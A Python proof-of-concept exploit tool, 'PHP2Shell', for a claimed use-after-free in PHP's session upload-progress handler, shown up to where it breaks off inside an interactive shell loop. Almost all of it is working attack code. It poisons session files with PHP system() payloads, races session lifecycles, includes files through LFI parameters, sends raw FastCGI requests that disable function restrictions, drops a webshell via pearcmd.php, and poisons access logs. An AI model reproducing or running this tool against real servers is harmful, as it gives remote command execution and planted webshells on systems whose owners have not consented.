#!/usr/bin/env python3
"""
PHP2Shell PoC — CVE-2026-109618 / CVE-2026-109619
Heap use-after-free in PHP session.upload_progress handler (php_session_rfc1867_callback).
Affects PHP 5.4+ (session.upload_progress.enabled ON by default).
CVSS 9.2 (v4.0). For authorized security research only.

Usage:
  python3 poc.py <url> [command]
  python3 poc.py http://target/index.php "id"
  python3 poc.py http://target/page.php "cat /etc/passwd" --lfi-param page

Attack chain:
  1. Poison session file: multipart POST with PHP_SESSION_UPLOAD_PROGRESS=<?php system(CMD);?>
     → PHP writes attacker-controlled PHP code into /var/lib/php/sessions/sess_<id>
  2. Race/UAF trigger: slow chunked upload + concurrent session lifecycle disturbance
     → CVE-2026-109618/9 heap use-after-free in php_session_rfc1867_callback
  3. LFI trigger: include the poisoned session file to execute the payload
     → command output extracted from response
"""

import argparse
import socket
import ssl
import struct
import threading
import time
import uuid
import sys
import re
import shlex
import urllib.request
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional

# ─── terminal colors ─────────────────────────────────────────────────────────
import os

_TTY = hasattr(sys.stdout, "isatty") and sys.stdout.isatty()
USE_COLOR = os.environ.get("NO_COLOR") is None and (
    _TTY or os.environ.get("FORCE_COLOR") is not None)


def _c(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if USE_COLOR else text


def cgreen(t: str) -> str:
    return _c("92", t)


def cred(t: str) -> str:
    return _c("91", t)


def cyel(t: str) -> str:
    return _c("93", t)


def ccyan(t: str) -> str:
    return _c("96", t)


def cbold(t: str) -> str:
    return _c("1", t)


def cdim(t: str) -> str:
    return _c("2", t)


# ─── PHP version flagging ────────────────────────────────────────────────────
# Vulnerable branches (CVE-2026-109618 / CVE-2026-109619):
#   PHP 5.4 ... 8.1  : all versions vulnerable, EOL, no backport
#   PHP 8.2          : vulnerable through 8.2.34, fixed 8.2.35
#   PHP 8.3          : vulnerable through 8.3.35, fixed 8.3.36
#   PHP 8.4          : vulnerable through 8.4.26, fixed 8.4.27
#   PHP 8.5          : vulnerable through 8.5.11, fixed 8.5.12
_FIXED = {82: 35, 83: 36, 84: 27, 85: 12}


def php_version_verdict(ver: Optional[tuple]) -> tuple:
    """ver=(major,minor,patch). Returns (label, vulnerable_bool)."""
    if ver is None:
        return ("version ?", False)
    maj, mnr, pat = ver
    if maj < 8 or (maj == 8 and mnr <= 1):
        return (f"PHP {maj}.{mnr}.{pat} VULNERABLE (EOL branch, no fix ever)",
                True)
    key = maj * 10 + mnr
    if key in _FIXED:
        if pat < _FIXED[key]:
            return (f"PHP {maj}.{mnr}.{pat} VULNERABLE "
                    f"(fixed from {maj}.{mnr}." + str(_FIXED[key]) + ")", True)
        return (f"PHP {maj}.{mnr}.{pat} PATCHED (>= "
                f"{maj}.{mnr}." + str(_FIXED[key]) + ")", False)
    if maj > 8:
        return (f"PHP {maj}.{mnr}.{pat} unknown branch (future release?)", False)
    return (f"PHP {maj}.{mnr}.{pat} branch unknown", False)


def parse_php_version(text: str) -> Optional[tuple]:
    m = re.search(r"PHP/(\d+)\.(\d+)\.(\d+)", text or "")
    if m:
        return (int(m.group(1)), int(m.group(2)), int(m.group(3)))
    return None


# ─── banner ──────────────────────────────────────────────────────────────────
_BANNER_ART = r"""
     ██████╗  ██╗  ██╗  ██████╗   ██████╗  ███████╗ ██╗  ██╗ ███████╗ ██╗     ██╗
     ██╔══██╗ ██║  ██║  ██╔══██╗ ██╔══██╗  ██╔════╝ ██║  ██║ ██╔════╝ ██║     ██║
     ██████╔╝ ███████║  ██████╔╝ ██████╔╝  █████╗   ███████║ █████╗   ██║     ██║
     ██╔═══╝  ██╔══██║  ██╔══██╗ ██╔══██╗  ██╔══╝   ██╔══██║ ██╔══╝   ██║     ██║
     ██║      ██║  ██║  ██║  ██║ ██████╔╝  ███████╗ ██║  ██║ ███████╗ ███████╗ ███████╗
     ╚═╝      ╚═╝  ╚═╝  ╚═╝  ╚═╝ ╚═════╝   ╚══════╝ ╚═╝  ╚═╝ ╚══════╝ ╚═════╝  ╚═════╝
"""

_BOMB_ART = r"""
             *                                            CVE-2026-109618 / CVE-2026-109619
             |                                                          CVSS 9.2
             \            ________                 session.upload_progress heap UAF
              \          /        \                      session poison -> LFI -> shell
              | \       |  [+]     |
              |  \      |   [+]    |                 WARN  authorized research only
              |___\      \         /                 >>    created by 0verDo$ed
                  \------\______/
                     (  B O M B  )
"""

_BOMB_ART2 = r"""
                        o
                       /
                    .-/
               __.-'  \
             ,'         \
            /    oo       )--------
            \            /
             `--.___.,--'
                  \
                   \
        [ PHP2SHELL bomb carrier ]
         CVE-2026-109618 / CVE-2026-109619
             >> created by 0verDo$ed
"""

_BOMB_ART3 = r"""
      ~ - - - ~
    /   ( ) \  ________________________________________
   |    _|_  | |  php2shell -- remote PHP session bomb  |
   |  _____  | |  CVE-2026-109618 / CVE-2026-109619     |
    \ |     |/ |  payload: session poison -> LFI -- RCE  |
      \____/   |  run  : python3 poc.py --help          |
               |________________________________________|
                        \  >>  created by 0verDo$ed
                         \________________________________
"""

_TAGLINES = [
    "the session file remembers everything",
    "upload fast, shell faster",
    "one multipart to shell them all",
    "session.upload_progress: making stacks free again",
    "use after fun (UAF)",
    "your cookies wrote PHP today",
    "slowloris' little brother: slowupload",
    "the fuse is lit -- poc.py --probe-only to sweep",
    "registries remember; rfc1867 callbacks forget",
    "PHP session files: the smallest shell you'll ship",
]


def _rand_banner():
    import random
    art = random.choice((_BOMB_ART, _BOMB_ART2, _BOMB_ART3))
    tag = random.choice(_TAGLINES)
    return art, tag


def print_banner():
    art, tag = _rand_banner()
    if USE_COLOR:
        for ln in art.rstrip("\n").split("\n"):
            if "created by 0verDo$ed" in ln:
                print(cgreen(cbold(ln)))
            elif "php2shell" in ln.lower() or "PHP2SHELL" in ln:
                print(ccyan(cbold(ln)))
            elif "CVE-2026" in ln or "payload:" in ln or "run :" in ln:
                print(cyel(ln))
            elif "authorized" in ln or "WARN" in ln:
                print(cyel(ln))
            else:
                print(cred(ln))
        print(cdim(f"    [{tag}]"))
        print()
    else:
        print(art)
        print(f"    [{tag}]")
        print()

# ─── helpers ────────────────────────────────────────────────────────────────

def make_socket(host: str, port: int, use_tls: bool,
                verify: bool = True, cafile: Optional[str] = None) -> socket.socket:
    s = socket.create_connection((host, port), timeout=30)
    if use_tls:
        ctx = ssl.create_default_context(cafile=cafile)
        if not verify:
            import warnings
            warnings.warn("TLS verification disabled — MITM risk", stacklevel=2)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def http_get(host: str, port: int, path: str, use_tls: bool,
             cookie: str = "", timeout: int = 10) -> tuple[int, str]:
    """Tiny synchronous GET; returns (status, body)."""
    scheme = "https" if use_tls else "http"
    url = f"{scheme}://{host}:{port}{path}"
    req = urllib.request.Request(url)
    if cookie:
        req.add_header("Cookie", cookie)
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""


def get_session_id(host: str, port: int, path: str, use_tls: bool) -> Optional[str]:
    """GET the target path, return PHPSESSID from Set-Cookie."""
    scheme = "https" if use_tls else "http"
    url = f"{scheme}://{host}:{port}{path}"
    req = urllib.request.Request(url)
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            for h, v in r.headers.items():
                if h.lower() == "set-cookie" and "PHPSESSID" in v:
                    for part in v.split(";"):
                        if "PHPSESSID=" in part:
                            return part.strip().split("=", 1)[1]
    except Exception:
        pass
    return None


# ─── slow upload (raw socket, chunked, paced) ────────────────────────────────

BOUNDARY = "----php2shellBoundary" + uuid.uuid4().hex[:8]

# Session file search paths — order: most common first
SESSION_PATHS = [
    "/tmp/sess_{sid}",
    "/var/lib/php/sessions/sess_{sid}",
    "/var/lib/php5/sessions/sess_{sid}",
    "/tmp/php_sessions/sess_{sid}",
    "/var/lib/php/session/sess_{sid}",
    "/var/tmp/sess_{sid}",
    # cPanel / Plesk
    "/home/tmp/sess_{sid}",
    "/usr/local/lib/php/sessions/sess_{sid}",
    # FreeBSD / macOS
    "/var/tmp/php_sessions/sess_{sid}",
    # Windows XAMPP / WAMP
    "C:/xampp/tmp/sess_{sid}",
    "C:/wamp/tmp/sess_{sid}",
    "C:/Windows/Temp/sess_{sid}",
    # Docker / Alpine
    "/run/php/sess_{sid}",
    "/data/sessions/sess_{sid}",
]

# Log files reachable via LFI — for log-poisoning fallback
LOG_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/httpd/access_log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/proc/self/fd/2",   # stderr → php-fpm error stream
    "/var/log/php-fpm.log",
    "/var/log/php7.4-fpm.log",
    "/var/log/php8.0-fpm.log",
    "/var/log/php8.1-fpm.log",
    "/var/log/php8.2-fpm.log",
    "/var/log/php8.3-fpm.log",
    "/var/log/php8.4-fpm.log",
    "/usr/local/var/log/php-fpm.log",
    # cPanel
    "/usr/local/apache/logs/access_log",
    "/usr/local/apache/logs/error_log",
]

# LFI parameter names to probe
LFI_PARAMS = ["page", "file", "include", "path", "template", "lang",
              "view", "p", "pg", "doc", "load", "read", "show",
              "content", "module", "dir", "src", "section", "layout",
              "theme", "config", "folder", "url", "uri", "route", "action"]

# Delimiter wrapping command output in the session-poison payload
OUTPUT_DELIM = "php2shell_out"


def poison_payload(command: str) -> str:
    """
    Upload key value that becomes a PHP variable name in the session file.
    Session file format: upload_progress_<KEY>|a:5:{...}
    With KEY = 'x<?php ...?>', the file contains raw PHP which executes on LFI.
    """
    command = command.replace("\\", "\\\\").replace("'", "\\'")
    # 'x' prefix keeps the variable name parser happy until the <?php tag
    return f"x<?php echo '{OUTPUT_DELIM}_start';system('{command}');echo '{OUTPUT_DELIM}_end';?>"


def extract_output(body: str) -> Optional[str]:
    start = f"{OUTPUT_DELIM}_start"
    end = f"{OUTPUT_DELIM}_end"
    i = body.find(start)
    j = body.find(end)
    if i != -1 and j != -1 and j > i:
        return body[i + len(start):j]
    return None


def build_multipart_body(upload_key: str, pad_fields: int = 80) -> bytes:
    """
    Build a multipart body that:
      - Contains PHP_SESSION_UPLOAD_PROGRESS=<upload_key> as the FIRST field
        (must precede the file field per RFC 1867 so PHP initialises the session entry)
      - Pads with <pad_fields> dummy form fields to widen the race window
      - Contains a large file field (streamed slowly to keep the parse loop alive)
    """
    parts = []

    # trigger field — must come first
    parts.append(
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{upload_key}\r\n"
    )

    # padding fields widen the RFC 1867 parse loop race window
    for i in range(pad_fields):
        parts.append(
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="pad_{i}"\r\n\r\n'
            f"{'A' * 64}\r\n"
        )

    # large file field — we stream this slowly
    payload = b"X" * (256 * 1024)  # 256 KB — enough to keep parse loop alive, much faster
    parts.append(
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="data.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    )

    header = "".join(parts).encode()
    footer = f"\r\n--{BOUNDARY}--\r\n".encode()
    return header + payload + footer


def slow_upload(host: str, port: int, path: str, use_tls: bool,
                session_id: str, upload_key: str,
                chunk_size: int = 512, chunk_delay: float = 0.005,
                stop_event: Optional[threading.Event] = None,
                verify: bool = True, cafile: Optional[str] = None) -> bool:
    """
    Send a multipart POST via a raw socket, drip-feeding chunks at <chunk_delay>s
    intervals. This keeps the RFC 1867 callback running during the race window.
    Returns True if a 5xx (crash) or connection reset was observed.
    """
    body = build_multipart_body(upload_key)
    content_length = len(body)

    request_line = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={session_id}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    try:
        s = make_socket(host, port, use_tls, verify=verify, cafile=cafile)
        s.sendall(request_line)
        offset = 0
        while offset < len(body):
            if stop_event and stop_event.is_set():
                s.close()
                return False
            chunk = body[offset:offset + chunk_size]
            s.sendall(chunk)
            offset += chunk_size
            time.sleep(chunk_delay)

        response = b""
        s.settimeout(5)
        try:
            while True:
                data = s.recv(4096)
                if not data:
                    break
                response += data
        except socket.timeout:
            pass
        s.close()

        status_line = response.split(b"\r\n", 1)[0].decode(errors="replace")
        code = int(status_line.split()[1]) if len(status_line.split()) >= 2 else 0
        return code >= 500
    except (ConnectionResetError, BrokenPipeError):
        return True  # crash indicator
    except Exception:
        return False


# ─── session disturber ───────────────────────────────────────────────────────

def session_disturber(host: str, port: int, path: str, use_tls: bool,
                      session_id: str, upload_key: str,
                      stop_event: threading.Event,
                      results: list, mode: str = "all"):
    """
    Fires multiple concurrent session-lifecycle disturbance patterns while
    the slow upload is in flight. Each pattern targets a different PHP
    session code path that can free the HashTable under the rfc1867 callback.

    modes: destroy | regenerate | gc | double | abort | all
    """
    patterns = {
        "destroy": lambda: _disturb_destroy(host, port, path, use_tls, session_id),
        "regenerate": lambda: _disturb_regenerate(host, port, path, use_tls, session_id),
        "gc": lambda: _disturb_gc(host, port, path, use_tls),
        "double": lambda: _disturb_double_upload(host, port, path, use_tls, session_id, upload_key),
        "abort": lambda: _disturb_abort(host, port, path, use_tls, session_id, upload_key),
    }

    selected = list(patterns.values()) if mode == "all" else [patterns[m] for m in mode.split(",") if m in patterns]

    round_num = 0
    while not stop_event.is_set():
        round_num += 1
        threads = []
        for fn in selected:
            t = threading.Thread(target=_run_disturbance, args=(fn, results), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=3)
        time.sleep(0.001)  # tight loop — maximize overlap with upload


def _run_disturbance(fn, results):
    try:
        r = fn()
        if r:
            results.append(r)
    except Exception:
        pass


def _disturb_destroy(host, port, path, use_tls, session_id):
    """session_destroy() equivalent: send a request that invalidates the session."""
    # Any request with the same PHPSESSID on a PHP page that calls session_destroy()
    # or session_regenerate_id(true) — we target the same path (many apps call
    # session_start() + session_regenerate_id() on login/logout endpoints).
    code, body = http_get(host, port, path, use_tls, cookie=f"PHPSESSID={session_id}")
    return ("destroy", code, "5xx" if code >= 500 else "ok")


def _disturb_regenerate(host, port, path, use_tls, session_id):
    """Trigger a second session_start with a bogus session id to force GC/destroy."""
    fake_sid = uuid.uuid4().hex
    code, _ = http_get(host, port, path, use_tls, cookie=f"PHPSESSID={fake_sid}")
    return ("regenerate", code)


def _disturb_gc(host, port, path, use_tls):
    """Flood with new session IDs to trigger session GC sweep."""
    for _ in range(5):
        fake_sid = uuid.uuid4().hex
        http_get(host, port, path, use_tls, cookie=f"PHPSESSID={fake_sid}", timeout=2)
    return ("gc",)


def _disturb_double_upload(host, port, path, use_tls, session_id, upload_key):
    """Second, smaller multipart with the same key — races the first upload's session init."""
    body = build_multipart_body(upload_key, pad_fields=1)
    content_length = len(body)
    try:
        s = make_socket(host, port, use_tls)
        req = (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={session_id}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Content-Length: {content_length}\r\nConnection: close\r\n\r\n"
        ).encode()
        s.sendall(req + body)
        s.settimeout(3)
        resp = b""
        try:
            while True:
                d = s.recv(4096)
                if not d:
                    break
                resp += d
        except socket.timeout:
            pass
        s.close()
        code = int(resp.split(b"\r\n", 1)[0].decode(errors="replace").split()[1]) if resp else 0
        return ("double_upload", code)
    except Exception:
        return ("double_upload", "exc")


def _disturb_abort(host, port, path, use_tls, session_id, upload_key):
    """Send and immediately abort (RST) — simulates client-abort path in PHP's rfc1867 handler."""
    body = build_multipart_body(upload_key, pad_fields=1)
    content_length = len(body)
    try:
        s = make_socket(host, port, use_tls)
        req = (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={session_id}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Content-Length: {content_length}\r\nConnection: close\r\n\r\n"
        ).encode()
        s.sendall(req + body[:1024])  # send partial body then RST
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\x01\x00\x00\x00\x00\x00\x00\x00')
        s.close()
        return ("abort",)
    except Exception:
        return ("abort", "exc")


# ─── LFI hit telemetry (session-wide fast path) ─────────────────────────────
_LFI_TELEMETRY = {"param": None, "tmpl": None}


# ─── LFI param auto-discovery ────────────────────────────────────────────────

def discover_lfi_params(host: str, port: int, path: str, use_tls: bool) -> list:
    """Spider target page; return query param names likely to be LFI sinks."""
    import re
    scheme = "https" if use_tls else "http"
    lfi_keywords = {
        "page", "file", "include", "path", "template", "lang", "view",
        "p", "pg", "doc", "load", "read", "show", "content", "module",
        "dir", "src", "section", "layout", "theme", "config", "folder",
        "url", "uri", "route", "action", "incl",
    }
    discovered: set = set()
    urls_to_check = [path, path.split("?")[0]]
    for check_path in urls_to_check:
        url = f"{scheme}://{host}:{port}{check_path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read().decode(errors="replace")
            # extract params from href/src/action attributes
            for m in re.finditer(r'''(?:href|src|action)=["']([^"']+)["']''', body):
                href = m.group(1)
                if "?" in href:
                    for k in urllib.parse.parse_qs(href.split("?", 1)[1]):
                        discovered.add(k)
            # extract form input/select names
            for m in re.finditer(r'''<(?:input|select)[^>]+name=["']([^"']+)["']''', body, re.I):
                discovered.add(m.group(1))
        except Exception:
            pass

    # return LFI-likely ones first, then rest
    likely = [p for p in discovered
              if p.lower() in lfi_keywords or
              any(k in p.lower() for k in ("page", "file", "path", "incl", "load", "view", "tmpl"))]
    other = [p for p in discovered if p not in likely]
    return likely + other


# ─── FastCGI direct (no-LFI path) ────────────────────────────────────────────

_FCGI_BEGIN_REQUEST = 1
_FCGI_PARAMS        = 4
_FCGI_STDIN         = 5
_FCGI_STDOUT        = 6
_FPM_PORTS          = [9000, 9001, 9002, 9003]
_DOC_ROOTS          = [
    "/var/www/html", "/var/www", "/app", "/app/public",
    "/srv/www/htdocs", "/usr/share/nginx/html", "/opt/www",
]


def _fcgi_record(rtype: int, req_id: int, data: bytes) -> bytes:
    clen = len(data)
    pad  = (-clen) % 8
    return struct.pack(">BBHHBx", 1, rtype, req_id, clen, pad) + data + b"\x00" * pad


def _fcgi_encode_params(params: dict) -> bytes:
    buf = b""
    for k, v in params.items():
        kb, vb = k.encode(), v.encode()
        def _enc(n: int) -> bytes:
            return struct.pack(">I", n | 0x80000000) if n > 127 else bytes([n])
        buf += _enc(len(kb)) + _enc(len(vb)) + kb + vb
    return buf


def _fcgi_parse_stdout(data: bytes) -> bytes:
    out, offset = b"", 0
    while offset + 8 <= len(data):
        _, rtype, _, clen, plen = struct.unpack_from(">BBHHBx", data, offset)
        offset += 8
        content = data[offset:offset + clen]
        offset += clen + plen
        if rtype == _FCGI_STDOUT:
            out += content
    return out


def _fastcgi_exec(fpm_host: str, fpm_port: int,
                  doc_root: str, script_path: str,
                  php_value: str) -> Optional[bytes]:
    """Send one raw FastCGI request; return stdout bytes or None on error."""
    try:
        sock = socket.create_connection((fpm_host, fpm_port), timeout=4)
    except Exception:
        return None

    params = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD":    "GET",
        "SCRIPT_FILENAME":   doc_root + script_path,
        "SCRIPT_NAME":       script_path,
        "DOCUMENT_ROOT":     doc_root,
        "SERVER_PROTOCOL":   "HTTP/1.1",
        "SERVER_NAME":       fpm_host,
        "SERVER_PORT":       "80",
        "PHP_VALUE":         php_value,
        "PHP_ADMIN_VALUE":   "allow_url_include=On\ndisable_functions=",
    }
    pdata = _fcgi_encode_params(params)
    payload = (
        _fcgi_record(_FCGI_BEGIN_REQUEST, 1, struct.pack(">HB5x", 1, 0))
        + _fcgi_record(_FCGI_PARAMS, 1, pdata)
        + _fcgi_record(_FCGI_PARAMS, 1, b"")
        + _fcgi_record(_FCGI_STDIN,  1, b"")
    )
    try:
        sock.sendall(payload)
        resp = b""
        sock.settimeout(5)
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        sock.close()
        return _fcgi_parse_stdout(resp)
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
        return None


def try_fastcgi_rce(host: str, port: int, path: str,
                    session_id: str, command: str,
                    wait_secs: float = 2.0) -> Optional[str]:
    """
    Probe FPM ports; for each reachable port try doc_root × script combos
    with PHP_VALUE=auto_prepend_file=<session_file>.  No LFI needed.
    Waits up to wait_secs for the session file to be written before firing.
    """
    script = path.split("?")[0] or "/index.php"
    candidate_scripts = list(dict.fromkeys([script, "/index.php"]))
    sess_files = [t.format(sid=session_id) for t in SESSION_PATHS[:6]]

    for fpm_port in _FPM_PORTS:
        try:
            socket.create_connection((host, fpm_port), timeout=1).close()
        except Exception:
            continue
        print(f"    [fastcgi] fpm:{fpm_port} reachable — waiting {wait_secs}s for session write...")
        time.sleep(wait_secs)
        for doc_root in _DOC_ROOTS:
            for scr in candidate_scripts:
                for sess_file in sess_files:
                    php_val = f"auto_prepend_file={sess_file}"
                    raw = _fastcgi_exec(host, fpm_port, doc_root, scr, php_val)
                    if raw:
                        body_bytes = raw.split(b"\r\n\r\n", 1)[-1]
                        out = extract_output(body_bytes.decode(errors="replace"))
                        if out is not None:
                            print(ccyan(f"    [fastcgi] hit: {doc_root}{scr} prepend={sess_file}"))
                            return out
    return None


# ─── PEAR webshell drop (no-LFI path) ────────────────────────────────────────

_PEAR_PATHS = [
    "/usr/local/lib/php/pearcmd.php",
    "/usr/lib/php/pearcmd.php",
    "/usr/share/php/pearcmd.php",
    "/usr/local/share/php/pearcmd.php",
]
_PEAR_WEBROOTS = [
    "/var/www/html", "/var/www", "/app", "/app/public",
    "/srv/www/htdocs", "/usr/share/nginx/html",
]


def try_pear_webshell(host: str, port: int, path: str, use_tls: bool,
                      command: str, lfi_param: Optional[str] = None,
                      verify: bool = True, cafile: Optional[str] = None) -> Optional[str]:
    """
    Use PEAR pearcmd.php config-create to write a PHP webshell to the webroot.
    Requires: register_argc_argv=On, pearcmd.php reachable via LFI param or directly.
    """
    scheme    = "https" if use_tls else "http"
    path_base = path.split("?")[0]
    shell_name = f"p2s_{uuid.uuid4().hex[:8]}.php"
    shell_payload = (
        f"<?php echo '{OUTPUT_DELIM}_start';system($_GET['c']);"
        f"echo '{OUTPUT_DELIM}_end';?>"
    )

    params_to_try = ([lfi_param] if lfi_param else []) + ["file", "page", "include", "path"]

    for pear_path in _PEAR_PATHS:
        for webroot in _PEAR_WEBROOTS:
            shell_abs = f"{webroot}/{shell_name}"
            qs_argv = f"+config-create+/{urllib.parse.quote(shell_payload, safe='')}+{shell_abs}"

            # Try via LFI param
            for param in params_to_try:
                url = (f"{scheme}://{host}:{port}{path_base}"
                       f"?{qs_argv}&{param}={urllib.parse.quote(pear_path)}")
                req = urllib.request.Request(url)
                req.add_header("User-Agent", "Mozilla/5.0")
                try:
                    urllib.request.urlopen(req, timeout=5).close()
                except Exception:
                    pass

            # Also try direct access to pearcmd.php
            url = f"{scheme}://{host}:{port}/pearcmd.php?{qs_argv}"
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Mozilla/5.0")
            try:
                urllib.request.urlopen(req, timeout=5).close()
            except Exception:
                pass

            # Check if shell was written
            shell_url = (f"{scheme}://{host}:{port}/{shell_name}"
                         f"?c={urllib.parse.quote(command)}")
            req = urllib.request.Request(shell_url)
            req.add_header("User-Agent", "Mozilla/5.0")
            try:
                with urllib.request.urlopen(req, timeout=5) as r:
                    body = r.read().decode(errors="replace")
                    out = extract_output(body)
                    if out is not None:
                        print(ccyan(f"    [pear] webshell at /{shell_name}"))
                        return out
            except Exception:
                pass
    return None


# ─── log poisoning ────────────────────────────────────────────────────────────

def try_log_poison(host: str, port: int, path: str, use_tls: bool,
                   command: str, lfi_param: Optional[str] = None,
                   verify: bool = True, cafile: Optional[str] = None) -> Optional[str]:
    """
    Inject PHP into User-Agent → Apache/nginx writes it to access log →
    LFI to the log file executes it.  Command is embedded directly so no
    extra GET param is needed.
    """
    scheme = "https" if use_tls else "http"
    path_base = path.split("?")[0]
    payload_ua = (
        f"php2shellLP<?php echo '{OUTPUT_DELIM}_start';"
        f"system('{command}');"
        f"echo '{OUTPUT_DELIM}_end';?>"
    )

    # 1. Poison the log
    poison_url = f"{scheme}://{host}:{port}{path_base}"
    req = urllib.request.Request(poison_url)
    req.add_header("User-Agent", payload_ua)
    try:
        with urllib.request.urlopen(req, timeout=8):
            pass
    except Exception:
        pass  # response doesn't matter — we just need the log write

    # 2. Try LFI to each log path
    params_to_try = ([lfi_param] if lfi_param else []) + LFI_PARAMS
    for log_path in LOG_PATHS:
        for param in params_to_try:
            url = f"{scheme}://{host}:{port}{path_base}?{param}={urllib.parse.quote(log_path)}"
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Mozilla/5.0")  # clean UA for the LFI hit
            try:
                if use_tls and not verify:
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                else:
                    opener = urllib.request.build_opener()
                with opener.open(req, timeout=8) as r:
                    body = r.read().decode(errors="replace")
                    out = extract_output(body)
                    if out is not None:
                        print(ccyan(f"    [log-poison] hit: {param}={log_path}"))
                        return out
            except Exception:
                pass
    return None


# ─── session-path auto-detect ────────────────────────────────────────────────

def detect_session_path(host: str, port: int, path: str, use_tls: bool) -> Optional[str]:
    """Parse phpinfo() from target or common paths; return session.save_path if found."""
    import re
    scheme = "https" if use_tls else "http"
    candidates = [path, "/phpinfo.php", "/info.php", "/php_info.php", "/?phpinfo=1"]
    for cpath in candidates:
        url = f"{scheme}://{host}:{port}{cpath}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read().decode(errors="replace")
                m = re.search(r'session\.save_path</td><td[^>]*>\s*([^<\s]+)', body)
                if m:
                    p = m.group(1).strip().rstrip("/")
                    if p and p not in ("no", "value", "no value"):
                        return p
        except Exception:
            pass
    return None


# ─── interactive shell (consistent, retrying) ────────────────────────────────

def _ifire(host, port, path, use_tls, session_id, sess_file,
           lfi_param, verify, cafile, timeout=4):
    """One LFI GET against one poisoned session file. Returns output or None."""
    scheme = "https" if use_tls else "http"
    path_base = path.split("?")[0]
    url = f"{scheme}://{host}:{port}{path_base}?{lfi_param}={urllib.parse.quote(sess_file)}"
    req = urllib.request.Request(url)
    req.add_header("Cookie", f"PHPSESSID={session_id}")
    req.add_header("User-Agent", "Mozilla/5.0")
    ctx = None
    if use_tls and (not verify):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx) if (use_tls and ctx)
        else urllib.request.HTTPHandler())
    try:
        with opener.open(req, timeout=timeout) as r:
            return extract_output(r.read().decode(errors="replace"))
    except Exception:
        return None


def interactive_shell(host: str, port: int, path: str, use_tls: bool,
                      lfi_param: Optional[str], known_sess_path: Optional[str],
                      chunk_size: int, chunk_delay: float,
                      verify: bool, cafile: Optional[str],
                      attempts: int = 3) -> None:
    print("[+] Interactive shell -- Ctrl+C or 'exit' to quit")
    path_base = path.split("?")[0]
    scheme = "https" if use_tls else "http"
    sess_templates = []
    if _LFI_TELEMETRY["tmpl"]:
        sess_templates.append(_LFI_TELEMETRY["tmpl"])
    if known_sess_path:
        t = f"{known_sess_path}/sess_{{sid}}"
        if t not in sess_templates:
            sess_templates.append(t)
    for t in SESSION_PATHS:
        if t not in sess_templates:
            sess_templates.append(t)

    param_order = []
    if _LFI_TELEMETRY["param"]:
        param_order.append(_LFI_TELEMETRY["param"])
    if lfi_param and lfi_param not in param_order:
        param_order.append(lfi_param)

    while True:
        try:
            cmd = input("php2shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exit")
            return
        if not cmd or cmd in ("exit", "quit"):
            return

        got = None
        for attempt in range(1, max(1, attempts) + 1):
            session_id = uuid.uuid4().hex
            upload_key = poison_payload(cmd)
            stop_event = threading.Event()

            def _up():
                slow_upload(host, port, path, use_tls, session_id, upload_key,
                            chunk_size=chunk_size, chunk_delay=chunk_delay,
                            stop_event=stop_event, verify=verify, cafile=cafile)

            up_thread = threading.Thread(target=_up, daemon=True)
            up_thread.start()
            time.sleep(0.25)

            deadline = time.time() + 10
            while got is None and time.time() < deadline:
                # fast path first: telemetry / user param, known session path
                fast_files = []
                if _LFI_TELEMETRY["tmpl"]:
                    fast_files.append((_LFI_TELEMETRY["param"] or lfi_param,
                                       _LFI_TELEMETRY["tmpl"].format(sid=session_id)))
                if lfi_param and known_sess_path:
                    f = f"{known_sess_path}/sess_{session_id}"
                    if f not in [x[1] for x in fast_files]:
                        fast_files.append((lfi_param, f))
                for p, f in fast_files:
                    if not p:
                        continue
                    out = _ifire(host, port, path, use_tls, session_id,
                                 f, p, verify, cafile)
                    if out is not None:
                        _LFI_TELEMETRY["param"] = p
                        got = out
                        break
                if got is not None:
                    break
                for p in param_order:
                    if not p:
                        continue
